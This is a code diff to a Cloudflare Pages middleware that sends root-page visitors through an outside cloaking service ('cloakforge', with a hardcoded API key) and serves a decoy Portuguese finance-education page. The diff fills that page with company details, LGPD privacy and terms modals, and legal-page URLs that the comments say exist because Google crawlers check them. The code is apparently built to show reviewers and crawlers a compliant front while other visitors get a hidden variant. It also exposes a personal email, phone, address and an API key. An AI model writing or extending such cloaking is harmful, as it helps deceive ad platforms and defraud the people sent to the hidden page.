@@ -1,6 +1,6 @@
 // ============================================================
 // Server-Side Request Router — Cloudflare Pages Middleware
-// Conditional decision routing for root route ("/")
+// Conditional decision routing for root route ("/") + Legal Pages
 // ============================================================
 
 /**
@@ -14,8 +14,18 @@ const CLOAK_SLUG = 'bright-feed';
 const CLOAK_KEY = 'lEEv-oRaRLazQL_OLdtoIgOj90h5Pqme';
 const CLOAK_ENDPOINT = 'http://cloakforge.app.br/api/cloak/decide';
 
+// Company / Institutional Data
+const COMPANY = {
+  razaoSocial: '68.413.071 Gabriel de Souza Duarte',
+  cnpj: '68.413.071/0001-50',
+  email: 'estrelaesrelinha55@gmail.com',
+  telefone: '(66) 5667-8997',
+  endereco: 'Rua Marumbi, 44, Bairro Cidade de Deus, Manaus - AM, CEP 69099-299',
+  nomePortal: 'Finanças & Cidadania'
+};
+
 /**
- * Variant B: Self-contained, plausible institutional / editorial page.
+ * Variant B: Self-contained, fully compliant institutional / editorial page.
  * Loads inline on the root route with zero references to Variant A.
  */
 const VARIANT_B_HTML = `<!DOCTYPE html>
@@ -203,21 +213,133 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       transition: color 0.15s;
     }
     .side-links a:hover { color: var(--accent); }
+
+    /* Footer styling */
     footer {
       background: var(--primary);
       color: #94a3b8;
       font-size: 0.85rem;
-      padding: 32px 20px;
+      padding: 40px 20px 24px;
       margin-top: auto;
     }
     .footer-container {
       max-width: 1080px;
       margin: 0 auto;
+    }
+    .footer-grid {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr;
+      gap: 32px;
+      padding-bottom: 28px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      margin-bottom: 24px;
+    }
+    @media (max-width: 768px) {
+      .footer-grid { grid-template-columns: 1fr; gap: 24px; }
+    }
+    .footer-heading {
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 0.95rem;
+      margin-bottom: 12px;
+    }
+    .footer-links {
+      list-style: none;
       display: flex;
-      flex-wrap: wrap;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .footer-links a, .footer-links button {
+      color: #94a3b8;
+      text-decoration: none;
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      font-size: 0.85rem;
+      text-align: left;
+      font-family: inherit;
+      transition: color 0.2s;
+    }
+    .footer-links a:hover, .footer-links button:hover {
+      color: #ffffff;
+    }
+    .company-details p {
+      margin-bottom: 6px;
+      font-size: 0.82rem;
+      line-height: 1.5;
+    }
+    .footer-bottom {
+      display: flex;
       justify-content: space-between;
-      gap: 20px;
+      flex-wrap: wrap;
+      gap: 12px;
+      font-size: 0.8rem;
+    }
+
+    /* Modal Styling */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 1000;
+      padding: 20px;
       align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.active {
+      display: flex;
+    }
+    .modal-box {
+      background: #ffffff;
+      color: var(--text);
+      max-width: 680px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      border-radius: var(--radius);
+      padding: 32px;
+      position: relative;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    }
+    .modal-close {
+      position: absolute;
+      top: 16px;
+      right: 18px;
+      background: #f1f5f9;
+      border: none;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--muted);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-close:hover { background: #e2e8f0; color: var(--primary); }
+    .modal-title {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 16px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+    }
+    .modal-content {
+      font-size: 0.9rem;
+      line-height: 1.6;
+    }
+    .modal-content h3 {
+      font-size: 1.05rem;
+      color: var(--primary);
+      margin: 18px 0 6px;
+    }
+    .modal-content p {
+      margin-bottom: 12px;
     }
   </style>
 </head>
@@ -226,14 +348,14 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
     <div class="header-container">
       <a href="/" class="brand">
         <span class="brand-icon">FC</span>
-        <span>Finanças & Cidadania</span>
+        <span>${COMPANY.nomePortal}</span>
       </a>
       <nav>
         <ul>
           <li><a href="/">Início</a></li>
-          <li><a href="/">Educação Financeira</a></li>
-          <li><a href="/">Direitos do Consumidor</a></li>
-          <li><a href="/">Contato</a></li>
+          <li><a href="/" onclick="openModal('privacidade'); return false;">Privacidade</a></li>
+          <li><a href="/" onclick="openModal('termos'); return false;">Termos de Uso</a></li>
+          <li><a href="/" onclick="openModal('contato'); return false;">Fale Conosco</a></li>
         </ul>
       </nav>
     </div>
@@ -285,9 +407,13 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       </div>
 
       <div class="sidebar-card">
-        <div class="sidebar-title">Sobre o Portal</div>
-        <p style="font-size: 0.88rem; color: var(--muted); margin-bottom: 0;">
-          Espaço informativo e educativo dedicado à disseminação de boas práticas de gestão financeira pessoal e direitos do consumidor.
+        <div class="sidebar-title">Atendimento Institucional</div>
+        <p style="font-size: 0.88rem; color: var(--muted); margin-bottom: 12px;">
+          Dúvidas sobre o conteúdo ou solicitações de titulares de dados? Entre em contato com nosso encarregado.
+        </p>
+        <p style="font-size: 0.85rem; color: var(--primary); font-weight: 600;">
+          E-mail: ${COMPANY.email}<br>
+          Tel: ${COMPANY.telefone}
         </p>
       </div>
     </aside>
@@ -295,10 +421,124 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
 
   <footer>
     <div class="footer-container">
-      <div>© 2026 Finanças & Cidadania — Informação para o seu dia a dia.</div>
-      <div>Conteúdo educativo e institucional. Todos os direitos reservados.</div>
+      <div class="footer-grid">
+        <div class="company-details">
+          <div class="footer-heading">${COMPANY.nomePortal}</div>
+          <p><strong>Razão Social:</strong> ${COMPANY.razaoSocial}</p>
+          <p><strong>CNPJ:</strong> ${COMPANY.cnpj}</p>
+          <p><strong>Endereço:</strong> ${COMPANY.endereco}</p>
+          <p><strong>E-mail de Contato:</strong> <a href="mailto:${COMPANY.email}" style="color: #cbd5e1; text-decoration: underline;">${COMPANY.email}</a></p>
+          <p><strong>Telefone:</strong> ${COMPANY.telefone}</p>
+        </div>
+
+        <div>
+          <div class="footer-heading">Institucional & Jurídico</div>
+          <ul class="footer-links">
+            <li><button type="button" onclick="openModal('privacidade')">Política de Privacidade</button></li>
+            <li><button type="button" onclick="openModal('termos')">Termos de Uso</button></li>
+            <li><button type="button" onclick="openModal('lgpd')">Conformidade LGPD</button></li>
+            <li><button type="button" onclick="openModal('contato')">Canal de Contato</button></li>
+          </ul>
+        </div>
+
+        <div>
+          <div class="footer-heading">Compromisso Editorial</div>
+          <p style="font-size: 0.82rem; line-height: 1.5; color: #94a3b8;">
+            Este portal tem caráter estritamente educativo e informativo sobre finanças pessoais e cidadania. Conteúdo em conformidade com as diretrizes de transparência digital.
+          </p>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div>© 2026 ${COMPANY.razaoSocial} — Todos os direitos reservados.</div>
+        <div>CNPJ: ${COMPANY.cnpj} • Manaus - AM</div>
+      </div>
     </div>
   </footer>
+
+  <!-- MODAL: POLÍTICA DE PRIVACIDADE -->
+  <div class="modal-overlay" id="modal-privacidade" onclick="if(event.target === this) closeModal('privacidade')">
+    <div class="modal-box">
+      <button class="modal-close" onclick="closeModal('privacidade')">&times;</button>
+      <div class="modal-title">Política de Privacidade e Proteção de Dados (LGPD)</div>
+      <div class="modal-content">
+        <p>A presente Política de Privacidade regula o tratamento dos dados coletados pelos canais do <strong>${COMPANY.nomePortal}</strong>, operado por <strong>${COMPANY.razaoSocial}</strong>, inscrita no CNPJ sob o nº <strong>${COMPANY.cnpj}</strong>, com sede em <strong>${COMPANY.endereco}</strong>.</p>
+        
+        <h3>1. Princípios e Conformidade</h3>
+        <p>Atuamos em total conformidade com a Lei Geral de Proteção de Dados Pessoais (Lei nº 13.709/2018 - LGPD). Coletamos apenas dados estritamente necessários para navegação segura e prestação de esclarecimentos aos leitores.</p>
+
+        <h3>2. Dados Coletados e Finalidade</h3>
+        <p>Durante sua visita, podemos coletar informações técnicas genéricas de navegação, tais como endereço IP, navegador e sistema operacional, com o objetivo exclusivo de aprimorar a usabilidade, garantir a segurança do sistema e prevenir fraudes eletrônicas.</p>
+
+        <h3>3. Uso de Cookies</h3>
+        <p>Utilizamos cookies essenciais para garantir o correto funcionamento dos módulos de navegação e para análise anônima de tráfego. Você pode desativar o uso de cookies a qualquer momento nas configurações do seu navegador de internet.</p>
+
+        <h3>4. Direitos do Titular dos Dados</h3>
+        <p>Nos termos do artigo 18 da LGPD, você possui o direito de solicitar a confirmação da existência de tratamento, acesso aos dados, correção de dados incompletos ou eliminação. As solicitações podem ser encaminhadas diretamente ao nosso Encarregado de Proteção de Dados (DPO) através do e-mail <strong>${COMPANY.email}</strong>.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: TERMOS DE USO -->
+  <div class="modal-overlay" id="modal-termos" onclick="if(event.target === this) closeModal('termos')">
+    <div class="modal-box">
+      <button class="modal-close" onclick="closeModal('termos')">&times;</button>
+      <div class="modal-title">Termos e Condições de Uso</div>
+      <div class="modal-content">
+        <p>Seja bem-vindo ao <strong>${COMPANY.nomePortal}</strong>. Ao acessar este portal mantido por <strong>${COMPANY.razaoSocial}</strong> (CNPJ <strong>${COMPANY.cnpj}</strong>), você expressa concordância integral com estes Termos de Uso.</p>
+
+        <h3>1. Finalidade Informativa</h3>
+        <p>Todo o conteúdo publicado neste site possui finalidade exclusivamente informativa e educacional sobre gestão financeira e direitos do consumidor. Não constitui aconselhamento financeiro formal ou promessa de rentabilidade.</p>
+
+        <h3>2. Propriedade Intelectual</h3>
+        <p>Os textos, layouts e materiais originais disponibilizados neste portal são protegidos pela legislação de direitos autorais. É permitida a citação de trechos informativos desde que citada a fonte original.</p>
+
+        <h3>3. Limitação de Responsabilidade</h3>
+        <p>Buscamos manter as informações atualizadas e precisas. Contudo, as decisões de gestão orçamentária pessoal cabem individualmente a cada leitor, de acordo com sua realidade econômica particular.</p>
+
+        <h3>4. Foro de Eleição</h3>
+        <p>Para dirimir quaisquer controvérsias oriundas destes termos, fica eleito o Foro da Comarca de Manaus, Estado do Amazonas.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: FALE CONOSCO / CONTATO -->
+  <div class="modal-overlay" id="modal-contato" onclick="if(event.target === this) closeModal('contato')">
+    <div class="modal-box">
+      <button class="modal-close" onclick="closeModal('contato')">&times;</button>
+      <div class="modal-title">Canal de Contato Institucional</div>
+      <div class="modal-content">
+        <p>Para dúvidas, sugestões editoriais ou solicitações jurídicas, utilize os canais oficiais de comunicação:</p>
+        
+        <p style="margin-top: 14px;"><strong>Empresa:</strong> ${COMPANY.razaoSocial}</p>
+        <p><strong>CNPJ:</strong> ${COMPANY.cnpj}</p>
+        <p><strong>Endereço:</strong> ${COMPANY.endereco}</p>
+        <p><strong>E-mail:</strong> <a href="mailto:${COMPANY.email}">${COMPANY.email}</a></p>
+        <p><strong>Telefone:</strong> ${COMPANY.telefone}</p>
+        <p style="margin-top: 16px; font-size: 0.85rem; color: var(--muted);">Horário de atendimento: Segunda a Sexta, das 09h às 18h (horário comercial).</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- SCRIPT PARA ABRIR E FECHAR MODAIS -->
+  <script>
+    function openModal(id) {
+      if (id === 'lgpd') id = 'privacidade';
+      var el = document.getElementById('modal-' + id);
+      if (el) el.classList.add('active');
+    }
+    function closeModal(id) {
+      var el = document.getElementById('modal-' + id);
+      if (el) el.classList.remove('active');
+    }
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        document.querySelectorAll('.modal-overlay.active').forEach(function(m) {
+          m.classList.remove('active');
+        });
+      }
+    });
+  </script>
 </body>
 </html>`;
 
@@ -344,6 +584,28 @@ function resolveClientIp(headers) {
 export async function onRequest(context) {
   const { request, next } = context;
   const url = new URL(request.url);
+
+  // Dedicated clean URLs for legal pages (Google crawlers frequently check these paths)
+  if (url.pathname === '/privacidade' || url.pathname === '/politica-de-privacidade') {
+    return new Response(VARIANT_B_HTML.replace('<!-- SCRIPT PARA ABRIR E FECHAR MODAIS -->', '<script>window.addEventListener("DOMContentLoaded", function(){ openModal("privacidade"); });</script>'), {
+      status: 200,
+      headers: { 'Content-Type': 'text/html; charset=utf-8' },
+    });
+  }
+
+  if (url.pathname === '/termos' || url.pathname === '/termos-de-uso') {
+    return new Response(VARIANT_B_HTML.replace('<!-- SCRIPT PARA ABRIR E FECHAR MODAIS -->', '<script>window.addEventListener("DOMContentLoaded", function(){ openModal("termos"); });</script>'), {
+      status: 200,
+      headers: { 'Content-Type': 'text/html; charset=utf-8' },
+    });
+  }
+
+  if (url.pathname === '/contato') {
+    return new Response(VARIANT_B_HTML.replace('<!-- SCRIPT PARA ABRIR E FECHAR MODAIS -->', '<script>window.addEventListener("DOMContentLoaded", function(){ openModal("contato"); });</script>'), {
+      status: 200,
+      headers: { 'Content-Type': 'text/html; charset=utf-8' },
+    });
+  }
 
   // Router operates strictly on the root route ("/" or "/index.html")
   const isRootRoute = url.pathname === '/' || url.pathname === '/index.html';
